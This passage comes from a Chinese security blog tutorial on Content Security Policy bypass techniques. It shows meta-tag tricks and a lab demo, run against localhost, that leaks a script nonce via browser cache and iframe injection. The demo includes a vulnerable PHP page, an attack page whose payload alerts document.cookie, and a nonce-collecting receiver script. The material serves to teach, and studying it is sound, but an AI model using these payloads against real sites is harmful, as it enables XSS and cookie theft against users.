class="string">"/"</span>;</span><br><span class="line">f.onload=<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;<span class="built_in">document</span>.cookie=i+<span class="string">"="</span>&#125;;</span><br><span class="line">	x=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">	x.src=<span class="string">'data:,alert("Pwned "+top.secret.textContent)'</span>;</span><br><span class="line">	pwn.contentWindow.document.body.appendChild(x)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(f);</span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/19.png" alt=""></p>
<h3 id="8、利用meta绕过CSP-nonce"><a href="#8、利用meta绕过CSP-nonce" class="headerlink" title="8、利用meta绕过CSP nonce"></a>8、利用meta绕过CSP nonce</h3><p>meta标签有一些不常用的功能有时候有奇效：</p>
<p>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"cache-control"</span> <span class="attr">content</span>=<span class="string">"public"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>meta可以设置Cookie（Firefox下），可以结合self-xss利用：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Set-Cookie"</span> <span class="attr">Content</span>=<span class="string">"cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21</span></span></span><br></pre></td></tr></table></figure>
<h3 id="9、利用浏览器缓存绕过script-nonce"><a href="#9、利用浏览器缓存绕过script-nonce" class="headerlink" title="9、利用浏览器缓存绕过script nonce"></a>9、利用浏览器缓存绕过script nonce</h3><p>整个原理过程以Demo为例，看图吧：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/24.png" alt=""></p>
<p>csp-test.php，开启了nonce script规则，并且有XSS点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function random_string( $length = 8 ) &#123; </span><br><span class="line">  $chars = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;; </span><br><span class="line">  $password = &apos;&apos;; </span><br><span class="line">  for($i = 0; $i &lt; $length; $i++)</span><br><span class="line">  &#123; </span><br><span class="line">    $password .= $chars[ mt_rand(0, strlen($chars) - 1) ]; </span><br><span class="line">  &#125; </span><br><span class="line">  return $password; </span><br><span class="line">&#125; </span><br><span class="line">$random = random_string(12);</span><br><span class="line">header(&apos;Content-Security-Policy: default-src \&apos;none\&apos;; script-src \&apos;nonce-&apos;.$random .&apos;\&apos;;&apos;);</span><br><span class="line">header(&apos;Cache-Control: max-age=99999999&apos;);</span><br><span class="line">setcookie(&apos;milk&apos;,&apos;tea&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script nonce=&apos;&lt;?php echo $random;?&gt;&apos;&gt;document.write(&apos;URL &apos; + unescape(location.href))&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&apos;&lt;?php echo $random;?&gt;&apos;&gt;console.log(&apos;another nonced script&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>然后我们需要利用iframe引入这个页面，并对其发起请求获取页面内容，这里我们通过向其中注入一个<code>&lt;textarea&gt;</code>标签来吃掉后面的script标签，这样就可以获取内容。</p>
</blockquote>
<p>attack.php：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=&quot;frame&quot; src=&quot;http://127.0.0.1/csp-test.php#&lt;form method=&apos;post&apos; action=&apos;http://127.0.0.1/nonce_receiver.php&apos;&gt;&lt;input type=&apos;submit&apos; value=&apos;test!&apos;&gt;&lt;textarea name=&apos;nonce&apos;&gt;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function getNonce() &#123; </span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.open(&quot;GET&quot;, &quot;nonce_receiver.php&quot;, false);</span><br><span class="line">    xhr.send();</span><br><span class="line">    return xhr.responseText;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  setTimeout(pollNonce, 1000);</span><br><span class="line">  function pollNonce() &#123;</span><br><span class="line">    var nonce = getNonce();</span><br><span class="line">    if (nonce == &quot;&quot;) &#123;</span><br><span class="line">      setTimeout(pollNonce, 1000);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      attack(nonce);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function attack(nonce) &#123;</span><br><span class="line">    var iframe = document.createElement(&quot;iframe&quot;);</span><br><span class="line">    var url = &quot;http://127.0.0.1/csp-test.php#&quot;</span><br><span class="line">    var payload = &quot;&lt;script nonce=&apos;&quot; + nonce + &quot;&apos;&gt;alert(document.cookie)&lt;/scr&quot; + &quot;ipt&gt;&quot;</span><br><span class="line">    var validationPayload = &quot;&lt;script&gt;alert(&apos;If you see this alert, CSP is not active&apos;)&lt;/scr&quot; + &quot;ipt&gt;&quot;</span><br><span class="line">    iframe.src = url + payload + validationPayload;</span><br><span class="line">    document.body.appendChild(iframe);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>然后我们需要一个页面去获取nonce字符串，为了反复获得，这里需要开启session。</p>
</blockquote>
<p>nonce_receiver.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST))&#123;</span><br><span class="line">	$message = $_POST[<span class="string">'nonce'</span>];</span><br><span class="line">	preg_match(<span class="string">'/(nonce=\')\w+\'/'</span>, $message, $matches);</span><br><span class="line">	$nonce_number = substr($matches[<span class="number">0</span>], <span class="number">7</span>, <span class="number">-1</span>);</span><br><span class="line">	$_SESSION[<span class="string">'nonce'</span>] = $nonce_number;</span><br><span class="line">	<span class="keyword">echo</span> $nonce_number;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SESSION[<span class="string">'nonce'</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> $_SESSION[<span class="string">'nonce'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>一切就绪了，唯一的问题就是在nonce script上，由于csp开启的问题，我们没办法自动实现自动提交，也就是攻击者必须要使按钮被点击，才能实现一次攻击。</p>
</blockquote>
<p>可以看到csp-test.php中的cookie被带回来了：</p>
<p><img src="/2019/02/24/CSP策略及绕过技巧小结/23.png" alt=""></p>
<h3 id="10、利用wave文件绕过script-src-‘self’"><a href="#10、利用wave文件绕过script-src-‘self’" class="headerlink" title="10、利用wave文件绕过script-src ‘self’"></a>10、利用wave文件绕过script-src ‘self’</h3><p>具体参考<a href="https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw" target="_blank" rel="noopener">使用 Wave 文件绕过 CSP 策略</a>。</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">CSP策略及绕过方法</a></p>
<p><a href="https://www.cnblogs.com/afanti/p/9298415.html" target="_blank" rel="noopener">通过iframe标签绕过csp</a></p>
<p><a href="http://www.bubuko.com/infodetail-2152128.html" target="_blank" rel="noopener">CSP学习和绕过</a></p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">Mi1k7ea</a></p>
        <p><span>发布时间:</span>2019-02-24, 13:47:07</p>
        <p><span>最后更新:</span>2019-05-28, 22:17:20</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2019/02/24/CSP策略及绕过技巧小结/" title="CSP策略及绕过技巧小结">https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/</a>
            <span class="copy-path" data-clipboard-text="原文: https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/　　作者: Mi1k7ea" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2019/03/03/栈及栈帧/">
                    栈基础
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2019/02/21/一道绕过CSP的XSS题目/">
                    一道绕过CSP的XSS题目
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-何为CSP"><span class="toc-number">1.</span> <span class="toc-text">0x01 何为CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CSP语法"><span class="toc-number">2.</span> <span class="toc-text">0x02 CSP语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#策略指令"><span class="toc-number">2.1.</span> <span class="toc-text">策略指令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#default-src"><span class="toc-number">2.1.1.</span> <span class="toc-text">default-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-src"><span class="toc-number">2.1.2.</span> <span class="toc-text">script-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#style-src"><span class="toc-number">2.1.3.</span> <span class="toc-text">style-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#img-src"><span class="toc-number">2.1.4.</span> <span class="toc-text">img-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-src"><span class="toc-number">2.1.5.</span> <span class="toc-text">font-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#connect-src"><span class="toc-number">2.1.6.</span> <span class="toc-text">connect-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#child-src"><span class="toc-number">2.1.7.</span> <span class="toc-text">child-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#manifest-src"><span class="toc-number">2.1.8.</span> <span class="toc-text">manifest-src</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内容源"><span class="toc-number">2.2.</span> <span class="toc-text">内容源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源列表"><span class="toc-number">2.2.1.</span> <span class="toc-text">源列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关键字"><span class="toc-number">2.2.2.</span> <span class="toc-text">关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据"><span class="toc-number">2.2.3.</span> <span class="toc-text">数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-CSP绕过"><span class="toc-number">3.</span> <span class="toc-text">0x03 CSP绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、绕过default-src-‘none’"><span class="toc-number">3.1.</span> <span class="toc-text">1、绕过default-src ‘none’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、形同虚设的script-src-‘unsafe-inline’"><span class="toc-number">3.2.</span> <span class="toc-text">2、形同虚设的script-src ‘unsafe-inline’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、绕过xx-src"><span class="toc-number">3.3.</span> <span class="toc-text">3、绕过xx-src *</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、利用link绕过xx-src-self"><span class="toc-number">3.4.</span> <span class="toc-text">4、利用link绕过xx-src self</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5、利用浏览器补全绕过script-nonce"><span class="toc-number">3.5.</span> <span class="toc-text">5、利用浏览器补全绕过script nonce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6、利用Gadgets和strict-dynamic-unsafe-eval绕过"><span class="toc-number">3.6.</span> <span class="toc-text">6、利用Gadgets和strict-dynamic/unsafe-eval绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7、利用iframe绕过"><span class="toc-number">3.7.</span> <span class="toc-text">7、利用iframe绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#（1）如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP："><span class="toc-number">3.7.1.</span> <span class="toc-text">（1）如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（2）在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http-xxx“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库："><span class="toc-number">3.7.2.</span> <span class="toc-text">（2）在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http://xxx“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（3）绕过sandbox："><span class="toc-number">3.7.3.</span> <span class="toc-text">（3）绕过sandbox：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8、利用meta绕过CSP-nonce"><span class="toc-number">3.8.</span> <span class="toc-text">8、利用meta绕过CSP nonce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9、利用浏览器缓存绕过script-nonce"><span class="toc-number">3.9.</span> <span class="toc-text">9、利用浏览器缓存绕过script nonce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10、利用wave文件绕过script-src-‘self’"><span class="toc-number">3.10.</span> <span class="toc-text">10、利用wave文件绕过script-src ‘self’</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"CSP策略及绕过技巧小结　| Mi1k7ea　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2019/03/03/栈及栈帧/" title="上一篇: 栈基础">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2019/02/21/一道绕过CSP的XSS题目/" title="下一篇: 一道绕过CSP的XSS题目">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/27/堆基础/">堆基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/栈及栈帧/">栈基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/01/Java反射机制/">Java反射机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2019 Mi1k7ea
            </div>
            <div class="footer-right">
                Welcome to M1ik7ea's blog <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style="display:none">
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style="display:none">
                        <span id="page-visit" title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 4;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>